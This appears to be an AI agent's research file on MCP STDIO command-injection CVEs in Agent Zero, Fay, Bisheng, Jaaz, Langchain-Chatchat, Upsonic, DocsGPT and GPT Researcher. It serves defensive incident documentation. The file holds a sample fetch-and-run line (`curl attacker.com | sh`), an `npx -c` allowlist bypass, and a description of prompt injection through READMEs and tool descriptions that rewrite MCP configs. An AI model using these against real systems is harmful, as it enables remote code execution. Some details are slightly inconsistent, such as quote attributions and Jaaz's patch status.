# AAGF-2026-078 Research Document
## MCP STDIO Design-Level Supply Chain Attack — Novel CVEs in Agent Zero, Fay, Bisheng/Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher

**Research date:** 2026-05-08  
**Researcher:** Stage 1 Research Agent  
**Target incident ID:** AAGF-2026-078

---

## Sources Fetched

| Source | Status | Notes |
|--------|--------|-------|
| https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html | SUCCESS | Good overview, CVE list, scale figures |
| https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/ | PARTIAL | Page renders dynamically; JavaScript/CSS only — no article body accessible |
| https://www.securityweek.com/by-design-flaw-in-mcp-could-enable-widespread-ai-supply-chain-attacks/ | SUCCESS | Technical mechanism, Anthropic response, scale |
| https://www.tomshardware.com/tech-industry/artificial-intelligence/anthropics-model-context-protocol-has-critical-security-flaw-exposed | PARTIAL | CSS/metadata only, no article body |
| https://nvd.nist.gov/vuln/detail/CVE-2026-30624 | SUCCESS | CVSS 8.6, Agent Zero 0.9.8, CWE-77 |
| https://nvd.nist.gov/vuln/detail/CVE-2026-30618 | FAIL | Reserved/not published |
| https://nvd.nist.gov/vuln/detail/CVE-2026-33224 | FAIL | Reserved/not published |
| https://nvd.nist.gov/vuln/detail/CVE-2026-30617 | SUCCESS | CVSS 8.6, Langchain-Chatchat 0.3.1, CWE-77 |
| https://nvd.nist.gov/vuln/detail/CVE-2026-30625 | SUCCESS | CVSS 9.8, Upsonic 0.71.6, CWE-77 |
| https://nvd.nist.gov/vuln/detail/CVE-2026-26015 | SUCCESS | CVSS 9.8 (v3.1) / 10.0 (v4.0), DocsGPT 0.15.0, CWE-77 |
| https://nvd.nist.gov/vuln/detail/CVE-2025-65720 | FAIL | Reserved/not published |
| https://nvd.nist.gov/vuln/detail/CVE-2026-40933 | SUCCESS | CVSS 9.9, Flowise < 3.1.0, CWE-78 |
| https://github.com/advisories/GHSA-c9gw-hvqq-f33r | SUCCESS | CVE-2026-40933 Flowise auth RCE via MCP adapters |
| https://github.com/advisories/GHSA-rppc-c4xv-v29h | SUCCESS | CVE-2026-30624 Agent Zero, CVSS 8.6 |
| https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-by-design-rce-ox-security-20260420-csa/ | SUCCESS | Technical summary, 4 exploitation families, scale |
| https://www.csoonline.com/article/4159889/rce-by-design-mcp-architectural-choice-haunts-ai-agent-ecosystem.html | SUCCESS | Technical mechanism, Anthropic response, affected frameworks |
| https://pasqualepillitteri.it/en/news/1151/anthropic-mcp-vulnerability-200000-ai-servers-rce | SUCCESS | Full CVE table with 14 entries, per-framework details |
| https://docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026 | SUCCESS | CVE-2026-30623 LiteLLM details, four-layer fix |
| https://www.theregister.com/security/2026/04/16/mcp-design-flaw-puts-200k-servers-at-risk-researcher/5222022 | SUCCESS | STDIO mechanism, 200K server claim, Anthropic response |
| https://feedly.com/cve/CVE-2026-30624 | SUCCESS | Agent Zero patch status confirmed |
| https://www.ox.security/blog/flowise-cve-2026-40933-upsonic-cve-2026-30625-what-to-do-when-best-practice-isnt-enough/ | PARTIAL | CSS/JS only |
| Web search: CVE-2026-30618 Fay | SUCCESS | Technical description found via search |
| Web search: CVE-2026-33224 Bisheng/Jaaz | SUCCESS | Bisheng patched; Jaaz is CVE-2026-30616 separately |
| Web search: CVE-2025-65720 GPT Researcher | SUCCESS | Critical severity, reverse shell via UI injection confirmed |
| Web search: Flowise CVE overlap | SUCCESS | CVE-2025-59528 vs CVE-2026-40933 confirmed as distinct |
| Internal incident files AAGF-2026-022, -013, -068, -057 | SUCCESS | Confirmed existing coverage and exclusion scope |

---

## Critical Context: What Is Already Documented

Before detailing the novel CVEs, the following table clarifies the existing documentation landscape for this CVE cluster:

| CVE | Framework | Already Documented? | Where |
|-----|-----------|---------------------|-------|
| CVE-2026-30615 | Windsurf | YES — EXCLUDE | AAGF-2026-057 |
| CVE-2026-30623 | LiteLLM MCP STDIO | YES — EXCLUDE | AAGF-2026-022 (referenced), AAGF-2026-009 (different LiteLLM incident) |
| CVE-2026-26015 | DocsGPT | NO | Novel for AAGF-2026-078 |
| CVE-2026-40933 | Flowise MCP adapter | YES — EXCLUDE | AAGF-2026-068 |
| CVE-2025-59528 | Flowise CustomMCP (old) | YES — EXCLUDE | AAGF-2026-013 |
| CVE-2026-30624 | Agent Zero | NO | Novel for AAGF-2026-078 |
| CVE-2026-30618 | Fay Framework | NO | Novel for AAGF-2026-078 |
| CVE-2026-33224 | Bisheng | NO | Novel for AAGF-2026-078 |
| CVE-2026-30616 | Jaaz | NO | Novel for AAGF-2026-078 |
| CVE-2026-30617 | Langchain-Chatchat | NO | Novel for AAGF-2026-078 |
| CVE-2026-30625 | Upsonic | NO | Novel for AAGF-2026-078 |
| CVE-2025-65720 | GPT Researcher | NO | Novel for AAGF-2026-078 |

**IMPORTANT NOTE on Jaaz:** The initial task brief listed CVE-2026-33224 as "Bisheng/Jaaz." Research clarifies these are TWO separate CVEs:
- CVE-2026-33224 = Bisheng (patched)
- CVE-2026-30616 = Jaaz (separate CVE, critical severity)

CVE-2026-30616 was discovered during research and should also be included in AAGF-2026-078.

### Flowise Overlap Resolution

CVE-2026-40933 (Flowise authenticated RCE via MCP adapters, fixed in 3.1.0) is ALREADY documented in AAGF-2026-068. This is a different vulnerability from CVE-2025-59528 (Flowise CustomMCP unauthenticated JavaScript injection, fixed in 3.0.6), which is documented in AAGF-2026-013.

Key distinctions:
- CVE-2025-59528: unauthenticated, JavaScript code injection, CWE-94, fixed v3.0.6 (Sept 2025), CVSS 10.0
- CVE-2026-40933: authenticated, OS command injection via MCP adapter serialization, CWE-78, fixed v3.1.0 (March 2026), CVSS 9.9–10.0

CVE-2026-40933 should be EXCLUDED from AAGF-2026-078 — it is already in AAGF-2026-068.

---

## Part 1: Core Technical Vulnerability

### The MCP STDIO "Execute-First, Validate-Never" Design Flaw

**Root mechanism:** Anthropic's Model Context Protocol uses STDIO (standard input/output) as its default local transport mechanism for spawning MCP servers as subprocesses. The protocol's STDIO transport accepts a `command` parameter that specifies what program to launch as the MCP server. The critical flaw: the SDK executes this command unconditionally and without restriction before performing any server validation.

As The Register described it: "The command is executed regardless of whether the process starts successfully. Pass in a malicious command, receive an error — and the command still runs. No sanitization warnings."

**Technical execution flow:**
1. An MCP client receives or processes a configuration containing a `command` parameter
2. The SDK passes this value directly to the OS for subprocess execution (via Python's `subprocess.Popen`, Node's `spawn`, etc.) without validation
3. If the command is a legitimate MCP server (e.g., `npx @modelcontextprotocol/server-filesystem`), the server starts and returns a handle
4. If the command is malicious (e.g., `curl attacker.com | sh`), the command executes fully on the host OS
5. The SDK then detects no MCP server was started and returns an error — but the malicious payload has already completed
6. The entire execution is covert: the error response gives no indication that command execution occurred

**Why this is architectural, not implementation-level:**
- The same pattern appears identically across all four official SDKs: Python, TypeScript, Java, Rust
- It is a deliberate design decision — Anthropic confirmed the behavior as "expected" and declined to change it
- Every downstream developer who uses the official MCP SDK inherits the vulnerability without making any mistake
- One protocol-level change (e.g., a command allowlist or manifest-only execution model) would protect all downstream consumers; instead, each must independently rediscover and implement protections

**Anthropic's position:** When contacted by OX Security researchers in approximately January 2026, Anthropic declined to modify the protocol's architecture, characterizing the behavior as "expected behavior" and "by design." Approximately 9 days after initial contact, Anthropic updated its SECURITY.md to note that STDIO adapters "should be used with caution." OX Security researchers stated: "This change didn't fix anything." As of May 2026, no protocol-level fix has been implemented.

**Four exploitation families (per OX Security / CSA):**

1. **Unauthenticated/authenticated UI injection:** Remote registration of malicious STDIO server configurations via exposed management interfaces (no auth required in some cases). When any user initiates an agent session, the malicious command executes. Affects LangFlow, LangChain, LiteLLM, Fay, Langchain-Chatchat, Agent Zero, GPT Researcher, DocsGPT.

2. **Hardening bypass:** Platforms with input validation, allowlisting, or sandboxing were defeated. The key bypass: permitted commands like `npx` or `npm` accept argument flags (`-c <command>`, `--eval`) that enable arbitrary OS command execution within an allowed program. Affects Flowise (CVE-2026-40933), Upsonic (CVE-2026-30625).

3. **Zero-click prompt injection:** Attackers modify local MCP configuration files via rendered content (HTML in IDE, repository READMEs, malicious tool descriptions) without any user interaction. Windsurf (CVE-2026-30615, already AAGF-2026-057) was the most severe case; it required zero user interaction.

4. **Malicious marketplace distribution:** OX Security submitted benign proof-of-concept MCPs to 11 MCP registries; 9 of 11 accepted submissions without review. A real attacker could deploy malicious MCPs to thousands of developers before detection.

---

## Part 2: Individual CVE Details — 8 Novel CVEs

### CVE-2026-30624 — Agent Zero

**Product:** Agent Zero (autonomous AI agent framework)  
**Vulnerable version:** 0.9.8  
**Fixed version:** Unknown/unconfirmed as of publication date (April 15, 2026); marked as "reported" status  
**CVSS score:** 8.6 (HIGH)  
**CVSS vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H  
**CWE:** CWE-77 (Command Injection)  
**GitHub Advisory:** GHSA-rppc-c4xv-v29h  
**Published:** April 15, 2026  
**Source:** NVD, Feedly, GitHub Advisory Database

**Technical mechanism:** Agent Zero allows users to define External MCP Servers via a JSON configuration containing `command` and `args` fields. These values are passed directly to the MCP STDIO transport and executed as OS subprocesses without validation or restriction. An attacker who can supply or manipulate the MCP configuration can execute arbitrary OS commands with the privileges of the Agent Zero process.

**Attack surface:** The External MCP Servers configuration UI/API is network-accessible (AV:N) and requires no authentication (PR:N) in the vulnerable version.

**Wild exploitation:** No confirmed exploitation reported as of research date. EPSS score 0.3% at time of publication (low probability).

**Patch status:** Patch availability unconfirmed at publication; Agent Zero listed as "reported" status alongside Windsurf and Langchain-Chatchat. Follow-up with vendor recommended.

---

### CVE-2026-30618 — Fay Digital Human Framework

**Product:** Fay (Fay数字人 — open-source Chinese digital human/AI character framework)  
**Vulnerable version:** Unspecified in NVD (entry reserved/not published)  
**Fixed version:** Unknown  
**CVSS score:** Critical (specific numeric score not in NVD; search sources describe as critical class)  
**CWE:** CWE-77 (Command Injection)  
**NVD status:** Reserved — not yet published  
**Source:** Search results from OX Security advisory, TheHackerNews

**Technical mechanism:** Fay's Web-GUI allows users to add new MCP servers by supplying arbitrary `command` and argument values directly through the interface. The application routes this input directly to `StdioServerParameters` without sanitization or an approved command allowlist. The underlying OS executes the input as a subprocess. An attacker with access to the Web-GUI (which appears to be unauthenticated or weakly authenticated based on OX Security's description of it as "unauthenticated web GUI RCE") can achieve arbitrary OS command execution with the privileges of the Fay process.

**Attack surface:** Unauthenticated web GUI accessible over network.

**Wild exploitation:** No confirmed exploitation reported.

**Patch status:** Unknown — NVD entry remains reserved as of research date.

**Note:** Fay is a Chinese-language open-source project (GitHub: xszyou/Fay). The framework's user base is primarily Chinese-language, which may affect disclosure visibility and patch uptake monitoring.

---

### CVE-2026-33224 — Bisheng

**Product:** Bisheng (enterprise AI application development platform, DataElem Inc.)  
**Vulnerable version:** Versions prior to patch  
**Fixed version:** Patched — specific version unconfirmed (NVD entry reserved)  
**CVSS score:** Critical (specific numeric score not in NVD; described as critical in multiple sources)  
**CWE:** CWE-77 (Command Injection)  
**NVD status:** Reserved — not yet published  
**Source:** Pasqualepillitteri.it CVE table, OX Security advisory references, multiple news sources

**Technical mechanism:** Bisheng's MCP STDIO configuration allows users to supply arbitrary command values that are executed without validation. The specific injection pathway routes through STDIO configuration parameters without sanitization.

**Patch status:** PATCHED. Multiple sources confirm Bisheng released a patched version following OX Security's coordinated disclosure (described as "patched" in TheHackerNews and confirmed by CSA research note).

**Wild exploitation:** No confirmed exploitation reported.

**Note:** Bisheng is a major Chinese enterprise AI platform from DataElem Inc. with significant enterprise adoption in Chinese markets. The rapid patch response contrasts with some other affected frameworks.

---

### CVE-2026-30616 — Jaaz

**Product:** Jaaz (AI design tool / creative agent platform)  
**Vulnerable version:** Unspecified  
**Fixed version:** Unknown  
**CVSS score:** Critical (specific score not confirmed; described as critical in source table)  
**CWE:** CWE-77 (Command Injection)  
**Source:** Pasqualepillitteri.it CVE table (critical flaw in Jaaz allowing remote code execution via manipulated MCP server responses)

**Technical mechanism:** Command injection via MCP STDIO configuration. The specific pathway involves manipulated MCP server responses enabling arbitrary code execution.

**IMPORTANT NOTE:** This CVE was not in the original research brief. The brief listed CVE-2026-33224 as "Bisheng/Jaaz" — but these are two separate CVEs. CVE-2026-30616 (Jaaz) is distinct from CVE-2026-33224 (Bisheng). This CVE should be included in AAGF-2026-078 as it is novel and undocumented.

**Patch status:** Unknown.

**Wild exploitation:** No confirmed exploitation reported.

---

### CVE-2026-30617 — Langchain-Chatchat

**Product:** Langchain-Chatchat (open-source local knowledge base Q&A chatbot built on LangChain)  
**Vulnerable version:** 0.3.1  
**Fixed version:** Unknown/unconfirmed; listed as "reported" (unpatched) as of May 1, 2026 alongside Windsurf  
**CVSS score:** 8.6 (HIGH)  
**CVSS vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H  
**CWE:** CWE-77 (Command Injection)  
**NVD Published:** April 15, 2026; Last Modified: April 27, 2026  
**Source:** NVD (confirmed entry), OX Security advisory

**Technical mechanism:** Langchain-Chatchat 0.3.1 contains RCE in its MCP STDIO server configuration and execution handling. A remote attacker can access the publicly exposed MCP management interface and configure an MCP STDIO server with attacker-controlled command values. These are executed without validation as OS subprocesses, achieving RCE with the privileges of the Langchain-Chatchat process.

**Attack surface:** Publicly exposed MCP management interface, network-accessible, no authentication required (PR:N, AV:N).

**Patch status:** UNPATCHED as of May 1, 2026 per AAGF-2026-022 timeline. NVD entry last modified April 27, 2026 with no fix version documented.

**Wild exploitation:** No confirmed exploitation reported.

**Note on NVD enrichment:** The NVD entry notes this CVE is "not prioritized for NVD enrichment efforts" — a flag indicating the NVD team will not add CVSS scores or additional analysis. CVSS score from CISA-ADP source.

---

### CVE-2026-30625 — Upsonic

**Product:** Upsonic (Python AI agent orchestration/task execution framework)  
**Vulnerable version:** 0.71.6 and earlier  
**Fixed version:** 0.72.0 (partial mitigation — warnings added; full fix details unclear)  
**CVSS score:** 9.8 (CRITICAL)  
**CVSS vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**CWE:** CWE-77 (Command Injection)  
**GitHub fix commit:** 855053fce0662227d9246268ff4a0844b481a305  
**NVD Published:** April 15, 2026  
**Source:** NVD (confirmed entry), GitHub commit reference

**Technical mechanism (hardening bypass):** Upsonic 0.71.6 implements an allowlist for MCP task commands — but the allowlist includes `npm` and `npx`. These allowed tools accept argument flags (`-c`, `--eval`, `--require`) that enable execution of arbitrary OS commands. An attacker can define MCP tasks with controlled `command` and `args` values; even within the allowlist, executing `npx -c "require('child_process').exec('...')"` achieves arbitrary RCE. This is a hardening bypass — Upsonic attempted mitigation but the allowlist was insufficiently restrictive.

**Patch:** Version 0.72.0 added warnings about Stdio servers; full remediation status unclear. The GitHub commit 855053f addresses the specific bypass.

**Wild exploitation:** No confirmed exploitation reported.

**Note:** This is the most technically interesting case in the cluster because it demonstrates that allowlist-based defenses fail when the allowlisted tools themselves support code execution via argument flags. It illustrates why protocol-level enforcement (rather than per-project allowlists) is needed.

---

### CVE-2026-26015 — DocsGPT

**Product:** DocsGPT (GPT-powered documentation assistant, open-source, arc53/DocsGPT)  
**Vulnerable versions:** 0.15.0 through < 0.16.0  
**Fixed version:** 0.16.0  
**CVSS score (v3.1):** 9.8 (CRITICAL)  
**CVSS vector (v3.1):** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**CVSS score (v4.0):** 10.0 (CRITICAL)  
**CVSS vector (v4.0):** AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SC:H/SI:H/SA:H  
**CWE:** CWE-77 (Command Injection)  
**GitHub Security Advisory:** GHSA-gcrq-f296-2j74  
**GitHub Release Notes:** https://github.com/arc53/DocsGPT/releases/tag/0.16.0  
**NVD Published:** April 15, 2026  
**Source:** NVD (confirmed entry), GitHub advisory

**Technical mechanism:** DocsGPT's MCP test behavior can be bypassed by crafting a malicious payload that routes arbitrary commands through the MCP STDIO interface. The vulnerability affects both official sites and local/public deployments. The CVSS 4.0 score of 10.0 (maximum) reflects the lack of any authentication requirement, the high confidentiality/integrity/availability impact on both the vulnerable system and downstream systems (SC:H/SI:H/SA:H).

**Patch:** Fixed in v0.16.0. PATCHED.

**Wild exploitation:** No confirmed exploitation reported.

---

### CVE-2025-65720 — GPT Researcher

**Product:** GPT Researcher (autonomous AI research agent, assafelovic/gpt-researcher)  
**Vulnerable version:** Unspecified versions prior to fix  
**Fixed version:** "Pull the latest from main" (per OX Security guidance); no formal version tag confirmed  
**CVSS score:** Critical (specific numeric score not published in NVD — entry reserved)  
**NVD status:** Reserved — not yet published  
**CVE year note:** 2025 prefix despite April 2026 disclosure — indicates CVE was reserved in 2025  
**Source:** TheHackerNews CVE list, CSO Online, search results from OX Security advisory

**Technical mechanism:** GPT Researcher UI injection leading to reverse shell capability. Described as "CVE-2025-65720: GPT Researcher reverse shell via UI injection" — classified under the unauthenticated UI injection family. GPT Researcher has a public-facing UI that allows configuring research agents; the STDIO MCP configuration can be manipulated through this UI to inject reverse shell commands, achieving full RCE on the host.

**Attack surface:** Public-facing research UI with MCP server configuration capability.

**Wild exploitation:** No confirmed exploitation reported.

**Patch status:** No formal versioned patch; fix is in main branch. This creates a patch verification problem — users must pull from git rather than upgrading to a specific release version.

**Note on CVE year:** The 2025 prefix (CVE-2025-65720) vs. 2026 disclosure date suggests OX Security or a CNA reserved this CVE ID during 2025 research activities, prior to coordinated public disclosure in April 2026. This is consistent with OX Security stating their research began in November 2025.

---

## Part 3: Scale and Scope

### Claimed Statistics (all sourced from OX Security disclosure, April 2026)

| Metric | Figure | Source Confidence |
|--------|--------|-------------------|
| Publicly accessible MCP servers vulnerable | 7,000+ | Moderate — based on enumeration methodology |
| Total vulnerable instances including private/enterprise | 200,000+ | Low — OX Security estimate, methodology not detailed |
| Cumulative SDK/downstream package downloads | 150M+ | Moderate — aggregated across PyPI, npm, etc. |
| CVEs assigned from this research | 14+ (11 confirmed across frameworks + 3 related) | High — CVE IDs confirmed |
| Live production platforms exploited (controlled demo) | 6 | High — OX Security direct claim, pre-publication PoC |
| Open-source GitHub projects affected | 200+ | Low — OX Security estimate |
| MCP marketplace registries accepting malicious submissions | 9 of 11 | High — PoC demonstrated |

**Important caveat (from AAGF-2026-022 council verdict):** "The 200K server count and unified causal attribution across 14+ CVEs overstate verified evidence." The 7,000 figure is publicly enumerable; the 200,000 total is an extrapolation.

### Which 6 Live Production Platforms Were Exploited?

OX Security confirmed controlled exploitation on 6 live production platforms before publication. Sources are not explicit about all 6, but confirmed targets include:
- LiteLLM proxy (CVE-2026-30623) — patched
- DocsGPT (CVE-2026-26015) — patched
- Flowise (CVE-2026-40933 — already AAGF-2026-068)
- Bisheng (CVE-2026-33224) — patched

The other 2 of the 6 are not explicitly named across sources reviewed. Likely candidates based on the "confirmed patched" list: Upsonic and one other (possibly LangFlow or GPT Researcher, though LangFlow did not issue a CVE).

---

## Part 4: Anthropic's Position

**Anthropic declined to fix the protocol.** This is confirmed across all sources.

Specific statements sourced:
- Characterized the STDIO execution behavior as "expected behavior" (multiple sources)
- Characterized the behavior as "by design" (SecurityWeek)
- Response: Updated SECURITY.md to recommend STDIO adapters "be used with caution" (~9 days after OX Security contact)
- Did not implement protocol-level restrictions (command allowlisting, manifest execution, sandboxing)
- Shifted sanitization responsibility entirely to downstream developers

**Implications for operators:** Because Anthropic declined a protocol-level fix, every downstream MCP user must independently implement:
- Command allowlists (e.g., restricting to: `npx`, `uvx`, `python`, `python3`, `node`, `docker`, `deno`)
- Request-level validation
- Runtime re-validation when instantiating stdio clients
- Access controls on MCP management endpoints

The LiteLLM four-layer fix for CVE-2026-30623 is the most detailed public example of what adequate downstream remediation requires.

---

## Part 5: OX Security Background

**Organization:** OX Security — application security firm specializing in AI/LLM security research  
**Research team:** Moshe Siman Tov Bustan, Mustafa Naamnih, Nir Zadok, Roni Bar (four-person team)  
**Research period:** November 2025 through April 2026 (~5 months of systematic investigation)  
**First disclosure:** January 11, 2026 — LangFlow (no CVE issued)  
**Anthropic contact:** ~January 2026 (approximate; Anthropic updated SECURITY.md ~9 days later)  
**Public disclosure:** April 15, 2026 — "The Mother of All AI Supply Chains" advisory  
**Disclosure approach:** Coordinated responsible disclosure — vendors contacted before publication; patches available for some frameworks before CVE publication date  
**Total disclosures:** 30+ accepted disclosures; 10+ high/critical CVEs  

---

## Part 6: Relationship to Existing Incidents

| Related Incident | Connection | Note |
|-----------------|------------|-------|
| AAGF-2026-022 | Parent incident — documents the MCP STDIO design flaw itself | Do NOT re-document the protocol flaw; reference it |
| AAGF-2026-057 | CVE-2026-30615 (Windsurf) — same attack family | Exclude from AAGF-2026-078 |
| AAGF-2026-009 | LiteLLM PyPI supply chain compromise — different incident | Unrelated to CVE-2026-30623 MCP flaw |
| AAGF-2026-013 | CVE-2025-59528 (Flowise old RCE) | Exclude from AAGF-2026-078 |
| AAGF-2026-068 | CVE-2026-40933 (Flowise MCP adapter RCE) | ALREADY documented — exclude |
| AAGF-2026-056 | CVE-2026-42208 (LiteLLM SQL injection) | Entirely different vulnerability |

**Pattern group:** `mcp-protocol-security-crisis` — same as AAGF-2026-022, -013, -057, -068

---

## Part 7: CVE Status Summary Table

| CVE | Framework | CVSS | Patch Status | NVD Status |
|-----|-----------|------|--------------|-----------|
| CVE-2026-30624 | Agent Zero 0.9.8 | 8.6 HIGH | UNPATCHED (as of May 2026) | Published |
| CVE-2026-30618 | Fay Digital Human | Critical (unscored) | UNKNOWN | Reserved |
| CVE-2026-33224 | Bisheng | Critical (unscored) | PATCHED | Reserved |
| CVE-2026-30616 | Jaaz | Critical (unscored) | UNKNOWN | Not searched (found late) |
| CVE-2026-30617 | Langchain-Chatchat 0.3.1 | 8.6 HIGH | UNPATCHED (as of May 2026) | Published |
| CVE-2026-30625 | Upsonic 0.71.6 | 9.8 CRITICAL | PARTIAL (0.72.0 warnings only) | Published |
| CVE-2026-26015 | DocsGPT 0.15.0 | 9.8/10.0 CRITICAL | PATCHED (v0.16.0) | Published |
| CVE-2025-65720 | GPT Researcher | Critical (unscored) | PARTIAL (main branch fix) | Reserved |

---

## Part 8: Stage 2 Agent Recommendations

### Single vs. Multiple Incident Decision

**Recommendation: Single incident (AAGF-2026-078) covering all 8 novel CVEs.**

Rationale:
1. All 8 CVEs share an identical root cause: MCP STDIO execute-first design propagating through each framework's unsanitized configuration handling
2. All were disclosed simultaneously (April 15, 2026) as part of one OX Security coordinated campaign
3. The frameworks affected (Agent Zero, Fay, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher) are mid-tier open-source AI tools — none has the deployment scale of Flowise, LiteLLM, or Windsurf to warrant solo incidents
4. The analytical value is in the pattern — that the same flaw manifests across diverse use cases (digital humans, Chinese enterprise AI, documentation assistants, research agents, coding frameworks) demonstrates supply chain depth
5. Splitting across 8 incidents would create 8 thin entries with redundant root cause analysis

The one exception worth flagging: if GPT Researcher's "reverse shell via UI injection" pathway is significantly more novel than the others, it could warrant separate treatment. However, the mechanism is the same family; the "reverse shell" descriptor likely refers to the demonstration payload, not a distinct vulnerability class.

### Appropriate Framing

**Incident title direction:** "Eight AI Frameworks, One Protocol Flaw: MCP STDIO Supply Chain Reaches Digital Humans, Research Agents, and Enterprise AI" — or similar that emphasizes breadth of affected use cases (not just "developer tools") and the supply chain propagation

**Core story:**
- The same architectural flaw that hit Windsurf and LiteLLM (prominent developer tools) also reached an obscure Chinese digital human framework (Fay), an enterprise AI platform (Bisheng), a documentation chatbot (DocsGPT), an autonomous research agent (GPT Researcher), and two frameworks specifically designed for AI agent orchestration (Agent Zero, Upsonic)
- Three of the eight remain unpatched as of early May 2026 (Agent Zero, Langchain-Chatchat, Jaaz)
- Upsonic's partial fix demonstrates the specific danger of allowlist-based defenses when allowlisted tools (npx, npm) accept execution flags
- GPT Researcher's reverse shell vector emphasizes that research-oriented AI tools with public UIs are high-value targets
- Bisheng (enterprise Chinese AI platform) and Fay (digital human) represent non-obvious attack surfaces

**Actual vs. potential framing:**
- `actual_vs_potential`: "near-miss" — OX Security exploited these in controlled demos; no confirmed uncontrolled in-the-wild exploitation
- The near-miss potential is significant: these frameworks handle credentials, host access, agent configurations

### Key Facts for Stage 2 Agent

1. **Parent incident is AAGF-2026-022** — do not re-document the MCP STDIO protocol design flaw; reference it and focus on the individual framework impact
2. **CVE-2026-40933 (Flowise) is ALREADY in AAGF-2026-068** — exclude completely
3. **CVE-2026-30616 (Jaaz) is novel** — was not in original brief but should be included; it emerged during research
4. **Three CVEs remain in NVD "Reserved" status** (CVE-2026-30618 Fay, CVE-2026-33224 Bisheng, CVE-2025-65720 GPT Researcher) — CVSS scores unavailable; use "Critical" descriptor with caveat
5. **Two confirmed unpatched as of May 2026** (Agent Zero, Langchain-Chatchat per AAGF-2026-022 timeline)
6. **Upsonic partial patch** — 0.72.0 adds warnings, does not fully remediate
7. **DocsGPT and Bisheng are confirmed fully patched** — v0.16.0 and vendor patch respectively
8. **GPT Researcher fix is informal** — no versioned release, "pull from main" instruction
9. **CVSS scores confirmed:** CVE-2026-30624 = 8.6, CVE-2026-30617 = 8.6, CVE-2026-30625 = 9.8, CVE-2026-26015 = 9.8 (v3.1) / 10.0 (v4.0)
10. **OX Security researchers**: Moshe Siman Tov Bustan, Mustafa Naamnih, Nir Zadok, Roni Bar
11. **Disclosure date:** April 15, 2026 (all 8 CVEs disclosed simultaneously)
12. **No in-the-wild exploitation confirmed** for any of the 8 novel CVEs
13. **Pattern group tag:** `mcp-protocol-security-crisis`

### Suggested `date_occurred` for AAGF-2026-078

The vulnerability class has existed since MCP SDK adoption by each framework. For AAGF-2026-078's specific scope (individual framework implementations), the most defensible `date_occurred` is **April 15, 2026** (coordinated public disclosure date), or the date each framework first integrated MCP STDIO support (not determinable from available sources). Using the disclosure date is consistent with AAGF-2026-057 (Windsurf) precedent.

---

## Appendix: Notable Quotes for Incident Narrative

- OX Security: "What made this a supply chain event rather than a single CVE is that one architectural decision propagated silently into every language, every downstream library." 
- Anthropic: STDIO adapters "should be used with caution" (SECURITY.md update — OX Security's assessment: "This change didn't fix anything")
- CSA research note: "Execute-first, validate-never" (characterization of the STDIO execution pattern)
- SecurityWeek: "The command is executed regardless of whether the process starts successfully. Pass in a malicious command, receive an error — and the command still runs."
- OX Security on Upsonic: Demonstrates that even with allowlists, "permitted commands (npm, npx) accept argument flags enabling execution of arbitrary OS commands" — allowlist-based defenses are fragile without protocol-level enforcement
